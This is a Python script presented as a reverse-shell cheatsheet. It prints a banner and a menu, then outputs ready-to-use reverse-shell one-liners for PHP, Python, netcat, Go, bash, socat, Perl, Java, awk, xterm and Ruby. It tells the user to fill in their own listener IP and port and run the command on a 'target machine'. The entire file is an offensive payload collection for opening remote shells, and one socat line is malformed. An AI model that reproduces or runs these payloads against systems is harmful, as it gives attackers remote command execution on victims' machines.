#! /usr/env/python

def style(arg):
    WARNING = '\033[93m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    return f"{WARNING}{BOLD}{arg}{ENDC}"

def ks_welcome ():
    ks = '''
    ██╗░░██╗███╗░░██╗██╗░██████╗░██╗░░██╗████████╗  ░██████╗░██████╗░██╗░░░██╗░█████╗░██████╗░
    ██║░██╔╝████╗░██║██║██╔════╝░██║░░██║╚══██╔══╝  ██╔════╝██╔═══██╗██║░░░██║██╔══██╗██╔══██╗
    █████═╝░██╔██╗██║██║██║░░██╗░███████║░░░██║░░░  ╚█████╗░██║██╗██║██║░░░██║███████║██║░░██║
    ██╔═██╗░██║╚████║██║██║░░╚██╗██╔══██║░░░██║░░░  ░╚═══██╗╚██████╔╝██║░░░██║██╔══██║██║░░██║
    ██║░╚██╗██║░╚███║██║╚██████╔╝██║░░██║░░░██║░░░  ██████╔╝░╚═██╔═╝░╚██████╔╝██║░░██║██████╔╝
    ╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░  ╚═════╝░░░░╚═╝░░░░╚═════╝░╚═╝░░╚═╝╚═════╝░
    '''
    print(f"{style(ks)}")
    print(f"\tKS REVSHELL (Cheatsheet)")
    print(f"\t\t\t@KNIGHT_VI (RD DURJOY)")

def rev_usage (arg):
    print(f"\n[+] USAGE:")
    print(f"\tReplace 'ip-address' with your own machine IP\n\tReplace 'port' with your own listening port.")
    print(f"\tAfter replacing IP and PORT, \n\tyou need to run the {style(arg)} command/code in target machine.\n")
    
def general_info ():
    print("\n[+] WHAT IS REVERSE SHELL:")
    print("\tA reverse shell is a type of shell that communicates back to the attacking machine.")
    print("\tThe attacking machine has a listening port on which it receives the connection,")
    print("\twhich is used to execute command")

def menu():
    print('''
    ===============================
    1.  PHP REVERSE SHELL          
    2.  PYTHON REVERSE SHELL       
    3.  NETCAT REVERSE SHELL        
    4.  GOLANG REVERSE SHELL   
    5.  BASH REVERSE SHELL
    6.  SOCKET REVERSE SHELL
    7.  PERL REVERSE SHELL
    8.  NCAT REVERSE SHELL
    9.  JAVA REVERSE SHELL
    10. AWK REVERSE SHELL
    11. XTERM REVERSE SHELL
    12. RUBY REVERSE SHELL     
    ===============================
    ''')
    choice = int(input("CHOICE # "))
    return choice

def rev_shell (arg):
    try:
        if arg==1:
            general_info()
            print(f"\n{style('[+] PHP REVERSE SHELL:')}")
            shell = '''php -r '$sock=fsockopen("ip-address",port);exec("/bin/sh -i <&3 >&3 2>&3");' '''
            print(f"\t{shell}")
            rev_usage("PHP")

        elif arg==2:
            general_info()
            print(f"\n{style('[+] PYTHON REVERSE SHELL:')}")
            shell = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip-address",port));os.dup2(s.fileno(),0); \n\tos.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''
            print(f"\t{shell}")
            rev_usage("PYTHON")

        elif arg==3:
            general_info()
            print(f"\n{style('[+] NETCAT REVERSE SHELL 01:')}")
            shell = '''nc  ip-address port -e /bin/sh'''
            print(f"\t{shell}")
            print(f"\n{style('[+] NETCAT REVERSE SHELL 02:')}")
            shell = '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip-address port >/tmp/f'''
            print(f"\t{shell}")
            rev_usage("NETCAT")

        elif arg==4:
            general_info()
            print(f"\n{style('[+] GOLANG REVERSE SHELL:')}")
            shell = '''echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ip-address:port");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;\n\tcmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'''
            print(f"\t{shell}")
            rev_usage("GOLANG")

        elif arg==5:
            general_info()
            print(f"\n{style('[+] BASH TCP REVERSE SHELL 01:')}")
            shell = '''bash -i >& /dev/tcp/ip-address/port 0>&1'''
            print(f"\t{shell}")
            print(f"\n{style('[+] BASH TCP REVERSE SHELL 02:')}")
            shell = '''0<&196;exec 196<>/dev/tcp/ip-address/port; sh <&196 >&196 2>&196'''
            print(f"\t{shell}")
            print(f"\n{style('[+] BASH UDP REVERSE SHELL 03:')}")
            shell = '''sh -i >& /dev/udp/ip-address/port 0>&1'''
            print(f"\t{shell}")
            rev_usage("BASH")  

        elif arg==6:
            general_info()
            print(f"\n{style('[+] SOCKET REVERSE SHELL:')}")
            shell = '''ATTACKER PAYLOAD LISTENER'''
            print(f"\t{shell}")
            shell = '''socat file:`tty`,raw,echo=0 TCP-L:port'''
            print(f"\t{shell}")
            shell = '''CLIENT SIDE'''
            print(f"\t{shell}")
            shell = '''/dev/shm exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ip-address:port'''
            print(f"\t{shell}")
            rev_usage("SOCKET")

        elif arg==7:
            general_info()
            print(f"\n{style('[+] PERL REVERSE SHELL:')}")
            shell = ''' perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ip-address:port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' '''
            print(f"\t{shell}")
            rev_usage("PERL")

        elif arg==8:
            general_info()
            print(f"\n{style('[+] NCAT REVERSE SHELL:')}")
            shell = ''' nc  ip-address port -e /bin/sh '''
            print(f"\t{shell}")
            rev_usage("NCAT")

        elif arg==9:
            general_info()
            print(f"\n{style('[+] JAVA REVERSE SHELL:')}")
            shell = '''r = Runtime.getRuntime()\n\tp = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/ip-address/port;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
                p.waitFor()'''
            print(f"\t{shell}")
            rev_usage("JAVA")

        elif arg==10:
            general_info()
            print(f"\n{style('[+] AWK REVERSE SHELL:')}")
            shell = '''awk 'BEGIN {s = "/inet/tcp/0/ip-address/port"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) \n\tprint $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null'''
            print(f"\t{shell}")
            rev_usage("AWK")

        elif arg==11:
            general_info()
            print(f"\n{style('[+] XTERM REVERSE SHELL:')}")
            shell = '''xterm -display ip-address:port'''
            print(f"\t{shell}")
            rev_usage("XTERM")

        elif arg==12:
            general_info()
            print(f"\n{style('[+] RUBY REVERSE SHELL:')}")
            shell = ''' ruby -rsocket -e'f=TCPSocket.open("ip-address",port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''
            print(f"\t{shell}")
            rev_usage("RUBY")

        else:
            print(f"\t{arg} is not in our list")

    except ValueError:
        print(f"\tWrong Input\n")

ks_welcome()
choice = menu()
rev_shell(choice)